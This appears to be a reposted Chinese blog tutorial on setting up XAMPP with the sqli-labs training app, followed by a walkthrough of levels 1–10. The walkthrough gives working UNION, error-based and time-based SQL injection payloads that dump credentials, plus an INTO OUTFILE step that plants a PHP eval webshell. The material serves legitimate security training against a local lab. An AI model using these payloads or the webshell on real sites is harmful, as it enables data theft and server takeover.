<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>搭建sql注入环境xampp+sqli-labs，及例子</title>
    <style type="text/css" media="all">
      body {
        margin: 0;
        font-family: "Helvetica Neue", Helvetica, Arial, "Hiragino Sans GB", sans-serif;
        font-size: 14px;
        line-height: 20px;
        color: #777;
        background-color: white;
      }
      .container {
        width: 700px;
        margin-right: auto;
        margin-left: auto;
      }

      .post {
        font-family: Georgia, "Times New Roman", Times, "SimSun", serif;
        position: relative;
        padding: 70px;
        bottom: 0;
        overflow-y: auto;
        font-size: 16px;
        font-weight: normal;
        line-height: 25px;
        color: #515151;
      }

      .post h1{
        font-size: 50px;
        font-weight: 500;
        line-height: 60px;
        margin-bottom: 40px;
        color: inherit;
      }

      .post p {
        margin: 0 0 35px 0;
      }

      .post img {
        border: 1px solid #D9D9D9;
      }

      .post a {
        color: #28A1C5;
      }
    </style>
  </head>
  <body>
    <div class="container">
      <div class="post">
        <h1 class="title">搭建sql注入环境xampp+sqli-labs，及例子</h1>
        <div class="show-content">
          <p>转载自https://www.cnblogs.com/sylarinfo/p/3456445.html</p><p>https://blog.csdn.net/sdb5858874/article/details/80727555</p><p>#xampp要下载php版本小于7的因为sqli-labs是php5写的</p><p>搭建服务器环境</p><p>1.下载xampp包</p><p>地址：<a href="http://www.apachefriends.org/zh_cn/xampp.html" target="_blank">http://www.apachefriends.org/zh_cn/xampp.html</a></p><p>  很多人觉得安装服务器是件不容易的事，特别是要想添加MySql, PHP组件，并且要配置起来让它们能够工作就更难了。这里介绍一个好用的软件xampp，他已经把所有的工作做完了，你要做的只需下载，解压缩，启动即可。它有提供各种操作系统的版本，同时也提供安装版和便携绿色版</p><p><br></p><p>2.使用xampp</p><p>  将下载的压缩包解压至D盘（你也可以放到你喜欢的地方，路径最好没有空格），双击xampp-control.exe启动控制台</p><div class="image-package">
<img class="uploaded-img" src="http://upload-images.jianshu.io/upload_images/18339009-f4ea9ddb1f956968.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" style="min-height:200px;min-width:200px;" width="auto" height="auto"><br><div class="image-caption"></div>
</div><p><br></p><p>  点击start启动apache和mysql</p><p><br></p><div class="image-package">
<img class="uploaded-img" src="http://upload-images.jianshu.io/upload_images/18339009-ca2a7927af6a85ae.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" style="min-height:200px;min-width:200px;" width="auto" height="auto"><br><div class="image-caption"></div>
</div><p><br></p><p>  这时可以看到启动的信息和端口。如果在你的电脑中无法启动apache服务，首先检查一下是不是端口有跟别的软件有冲突，如果是的话，可以修改httpd-ssl.conf里的 Listen 446，避免冲突</p><p><br></p><div class="image-package">
<img class="uploaded-img" src="http://upload-images.jianshu.io/upload_images/18339009-3ecd9c8dd4d12398.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" style="min-height:200px;min-width:200px;" width="auto" height="auto"><br><div class="image-caption"></div>
</div><p><br></p><p>确认apache和mysql都成功启动之后，浏览器中输入<a href="http://localhost:446/xampp/" target="_blank">http://localhost:446/xampp/</a>（注意端口号）可看到如下图即证明安装成功</p><div class="image-package">
<img class="uploaded-img" src="http://upload-images.jianshu.io/upload_images/18339009-d19a52a36f461e11.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" style="min-height:200px;min-width:200px;" width="auto" height="auto"><br><div class="image-caption"></div>
</div><p><br></p><p>安装sql注入实验网站</p><p>  下面是sql注入环境的搭建</p><p>1. 下载sql实验环境</p><p>  所用环境的代码是一个印度人的开源项目平台。里面包含了基本的各种注入类型，同时又有get和post类型，以及一些基本的绕过学习。</p><p>下载地址：<a href="https://github.com/Audi-1/sqli-labs" target="_blank">https://github.com/Audi-1/sqli-labs</a></p><div class="image-package">
<img class="uploaded-img" src="http://upload-images.jianshu.io/upload_images/18339009-6aaa7c2d1cc5f08d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" style="min-height:200px;min-width:200px;" width="auto" height="auto"><br><div class="image-caption"></div>
</div><p><br></p><p>2. 安装</p><p>  将下载好的源代码包解压到xampp目录下的\htdocs文件夹，重命名为sqli-labs。然后编辑sql-connections文件夹下的db-creds.inc文件配置数据库。xampp 自带的mysql默认用户名是root，密码为空。</p><div class="image-package">
<img class="uploaded-img" src="http://upload-images.jianshu.io/upload_images/18339009-9b3c3b06c3633ed5.gif?imageMogr2/auto-orient/strip" style="min-height:200px;min-width:200px;" width="auto" height="auto"><br><div class="image-caption"></div>
</div><p><br></p><div class="image-package">
<img class="uploaded-img" src="http://upload-images.jianshu.io/upload_images/18339009-849c676462550163.gif?imageMogr2/auto-orient/strip" style="min-height:200px;min-width:200px;" width="auto" height="auto"><br><div class="image-caption"></div>
</div><p><br></p><p>打开浏览器链接<a href="http://localhost:446/sqli-labs/" target="_blank">http://localhost:446/sqli-labs/</a>，点击网页上的Setup/reset Database for labs，将数据库建起来了之后就可以使用。在实验过程中可能会破坏数据库完整性，也可以点击这个恢复初始数据。</p><p><br></p><p><br></p><div class="image-package">
<img class="uploaded-img" src="http://upload-images.jianshu.io/upload_images/18339009-01448f1073734ae1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" style="min-height:200px;min-width:200px;" width="auto" height="auto"><br><div class="image-caption"></div>
</div><p><br></p><p>3.如何使用（以第一课为例）</p><p>点击第一课Less-1</p><div class="image-package">
<img class="uploaded-img" src="http://upload-images.jianshu.io/upload_images/18339009-cd88184f42d8d242.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" style="min-height:200px;min-width:200px;" width="auto" height="auto"><br><div class="image-caption"></div>
</div><p><br></p><p>这个是基于get的页面，我们直接在链接后跟?id=1 看效果</p><div class="image-package">
<img class="uploaded-img" src="http://upload-images.jianshu.io/upload_images/18339009-062cc97b516b7784.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" style="min-height:200px;min-width:200px;" width="auto" height="auto"><br><div class="image-caption"></div>
</div><p><br></p><p>可以看的有数据返回了。然后尝试下 ?id=\ 很明显没有对数据库错误回显进行处理。这是最基本的一个例子，大家可以尝试更高级的例子</p><div class="image-package">
<img class="uploaded-img" src="http://upload-images.jianshu.io/upload_images/18339009-5511b3e3d64bae08.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" style="min-height:200px;min-width:200px;" width="auto" height="auto"><br><div class="image-caption"></div>
</div><p>sqli-labs闯关指南 1—10 - 18年3月萌新白帽子 - CSDN博客</p><p>Original: <a href="https://blog.csdn.net/sdb5858874/article/details/80727555" target="_blank">blog.csdn.net</a></p><p>如果你是使用的phpstudy，请务必将sql的版本调到5.5以上，因为这样你的数据库内才会有information_schema数据库，方便进行实验测试。</p><p>另外-- （这里有一个空格，--空格）在SQL内表示注释，但在URL中，如果在最后加上-- ，浏览器在发送请求的时候会把URL末尾的空格舍去，所以我们用--+代替-- ，原因是+在URL被URL编码后会变成空格。</p><p>第一关</p><p>1.经过语句and 1=2测试 ，页面回显正常，所以该地方不是数值查询</p><p>2.接着尝试在id后面加上'，发现页面回显不正常，表示可能存在SQL字符注入</p><p>3.输入--+将sql后面的语句注视掉后，发现页面回显正常，则证明这个地方是单引号字符型注入</p><p>4.接着使用order by 语句判断，该表中一共有几列数据</p><p>  order by 3页面回显正常，order by 4页面回显不正常，说明此表一个有3列。</p><p>5.将id=1改为一个数据库不存在的id值，如861，使用union select 1,2,3联合查询语句查看页面是否有显示位。</p><p>发现页面先输出了2和3，说明页面有2个显示位</p><p>6.然后利用sql查询语句依次爆破出数据库内的数据库名，表名，列名，字段信息</p><p>例子：</p><p>http://127.0.0.1/sqli-labs/Less-1/?id=861' union select 1,(select group_concat(schema_name) from information_schema.schemata),3 --+</p><p>这是一个查询数据库名信息的语句</p><p>查询security内的所有表名</p><p>http://127.0.0.1/sqli-labs/Less-1/?id=861' union select 1,(select group_concat(schema_name) from information_schema.schemata),(select group_concat(table_name) from information_schema.tables where table_schema='security')--+</p><p>接着使用下面的语句爆破出列名</p><p>select group_concat(column_name) from information_schema.columns where table_name='users'</p><p>接着使用如下语句查询所有的用户名，密码</p><p>lesect group_concat(password) from security.users</p><p>lesect group_concat(username) from security.users</p><p>第二关、</p><p>1.输入?id=2-1页面信息发生变化，说明此处是数值型注入</p><p>2.order by 3  页面显示正常，order by 4页面显示不正常，所以该表有3列数据</p><p>接着可以使用联合查询进行注入，详细过程参考第一关</p><p>第三关、</p><p>1.向页面输入?id=2'  --+页面显示不正常，</p><p>但是输入  ?id=2') --+ 页面回显正常，说明此处是字符型注入,而且是以 ('')的方式闭合字符串的</p><p>2.接着使用order by 判断表中有3列数据</p><p>3.接着使用联合查询，union select 1，2，3 判断页面是否有显示位   答案：有</p><p>下面使用第一关所使用的查询语句，测试一下</p><p>页面显示没有问题</p><p>第四关、</p><p>与第三关类似，第四关使用   ("")   的方式闭合字符串，然后可以优先使用联合查询注入</p><p>1.当输入?id=3" --+时，页面显示不正常</p><p>2.当输入?id=3") --+</p><p>第五关、</p><p>1.经错测试发现，当输入?id=3时页面显示正常，具体如下</p><div class="image-package">
<img class="uploaded-img" src="http://upload-images.jianshu.io/upload_images/18339009-13d77ae1ef22ad99?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" style="min-height:200px;min-width:200px;" width="auto" height="auto"><br><div class="image-caption"></div>
</div><p>当输入?id=486页面显示如下</p><p>说明页面没有显示位。无法使用联合查询注入</p><p>2.接着我们尝试在URL中输入  ?id=2' 页面出现错误语句如下</p><p>页面出现SQL语句报错，在这里我们就可以使用一种新的注入方式：报错注入</p><p>首先介绍三种报错注入常用的语句：</p><p>(1). 通过floor报错</p><p>and (select 1 from (select count(*),concat((payload),floor (rand(0)*2))x from information_schema.tables group by x)a)</p><p>其中payload为你要插入的SQL语句</p><p>需要注意的是该语句将 输出字符长度限制为64个字符</p><p>(2). 通过updatexml报错</p><p>and updatexml(1,payload,1)</p><p>同样该语句对输出的字符长度也做了限制，其最长输出32位</p><p>并且该语句对payload的反悔类型也做了限制，只有在payload返回的不是xml格式才会生效</p><p>(3). 通过ExtractValue报错</p><p>and extractvalue(1, payload)</p><p>输出字符有长度限制，最长32位。</p><p>payload即我们要输入的sql查询语句</p><p>3.在这里我们使用floor报错语句进行注入</p><p>?id=2' and (select 1 from (select count(*),concat(((select group_concat(schema_name) from information_schema.schemata)),floor (rand(0)*2))x from information_schema.tables group by x)a) --+</p><p>这里发现页面提示我输出信息超过一行，但我们已经使用了group_concat函数，说明这里数据库名组成的字符串长度超过了64位，所以我们需要放弃group_concat函数，而使用limit 0,1来一个个输出</p><p>group_concat()函数的作用：将返回信息拼接成一行显示</p><p>limit 0,1  表示输出第一个数据。   0表示输出的起始位置，1表示跨度为1（即输出几个数据，1表示输出一个，2就表示输出两个）</p><p>接着我们运用如下语句：</p><p>and (select 1 from (select count(*),concat(((select schema_name from information_schema.schemata limit 0,1)),floor (rand(0)*2))x from information_schema.tables group by x)a) --+</p><p>需要注意的是，此时数据库名并不是 information_schema1</p><p>这个1是floor报错语句中输出的也一部分（无论输出什么结果，都会有这个1）</p><p>为了防止某些时候，我们误以为这个1也是我们查询结果的一部分，我建议大家使用一个；与它分开，语句如下：</p><p>?id=2' and (select 1 from (select count(*),concat(((select concat(schema_name,';') from information_schema.schemata limit 0,1)),floor (rand(0)*2))x from information_schema.tables group by x)a) --+</p><p>下面我们更该我们的payload一个个的查询我们要找的数据即可，这里不再演示</p><p>第六关、</p><p>与第5关类似，只不过这一关使用的是  ""的方式闭合字符串</p><p>我们只需要将?id=2' 改为 ?id=2"即可</p><p>其余过程不再赘述，请参考第五关</p><p>第七关、</p><p>想了一下，可能会有很多小白和我一样，对数据库file权限和 into outfile这个命令比较陌生，所以在这里科普一下file权限和into outfile这个函数。</p><p>数据库的file权限规定了数据库用户是否有权限向操作系统内写入和读取已存在的权限</p><p>into outfile命令使用的环境：</p><p>我们必须知道，服务器上一个可以写入文件的文件夹的完整路径</p><p>1.我们正常输入?id=1页面回显如下</p><p>2.当我们输入 and 1=2 页面显示依然正常，说明不是数值型注入</p><p>3.当我们输入?id=1'页面报错，说明可能存在"注入</p><p>4..当我们输入?id=1' --+页面显示依然不正常</p><p>5.接着我们尝试?id=1') --+，页面依然显示不正常，有点难受，不过没关系</p><p>6.我们可以接着输入?id=5'))  --+尝试，发现页面回显正常</p><p>7. 由于本关卡提示我们使用file权限向服务器写入文件，我们就先尝试下写数据</p><p>由于我用的是phpstudy搭建的环境，所以我直接在我本机取一个目录就好</p><p>C:\phpStudy\PHPTutorial\MySQL\data</p><p>然后使用union select 1,2,3 into outfile "C:\phpStudy\PHPTutorial\MySQL\data\chao.php" 尝试写入文件。</p><p>然后去本机文件夹下查看文件是否写入成功。</p><p>写入成功了，但是文件名变成了如图红色表示的那样！！</p><p>接着我进行了好多次尝试，最后被同学告知，需要使用\\来代替目录中的\ ，具体原因我也不知道，后续会补上。  命令如下：</p><p>union select 1,2,3 into outfile "C:\\phpStudy\\PHPTutorial\\MySQL\\data\\chao.php"</p><p>文件导入成功!，接着我们查看chao.php的内容</p><p>需要注意的是利用数据库file权限向操作系统写入文件时， 对于相同文件名的文件不能覆盖，所以如果第一次上传chao.php，下次在上传chao.php，就是无效命令了，也就是新的chao,php中的内容并不会覆盖，之前的chao.php</p><p>我们再尝试上传一句话木马，具体命令</p><p>?id=-1'))  union select 1,"&lt;?php @eval($_POST['chopper']);?&gt;",3 into outfile "C:\\phpStudy\\PHPTutorial\\WWW\\123456.php" --+</p><p>接着试着访问一下这个文件</p><p>上传成功，使用菜刀链接下</p><p>连接成功！！！！</p><p>第八关、</p><p>1.?id=2' --+ 页面回显正常，不赘述了，这里是单引号字符型注入</p><p>2.页面没有显示位，没有数据库报错信息。</p><p>我们先尝试一下是否有file权限</p><p>http://127.0.0.1/sqli-labs/Less-8/?id=2' union select 1,2,3 into outfile "C:\\phpStudy\\PHPTutorial\\WWW\\88888.php"--+</p><p>上传成功</p><p>当然我尝试下了下布尔和时间盲注，都是可以的</p><p>第九关、</p><p>这里我们尝试使用单引号和双引号闭合，发现页面回显一直正常，说明该关卡可能将我们的单双引号给退意了。</p><p>但是我输入%df之后页面回显依然正常，这个时候我觉得应该是无论我输入什么页面回显都是一样的。所以我尝试使用sleep()函数来测试</p><p>经过多次尝试，这里是单引号闭合的时间注入</p><p>' and sleep(5)</p><p>第十关、</p><p>基于双引号的时间注入</p><p>?id=2" and sleep(5) --+</p><p>这里我就不在一个一个字母的去测试了，大家了解一下时间盲注就好</p>
        </div>
      </div>
    </div>
  </body>
</html>
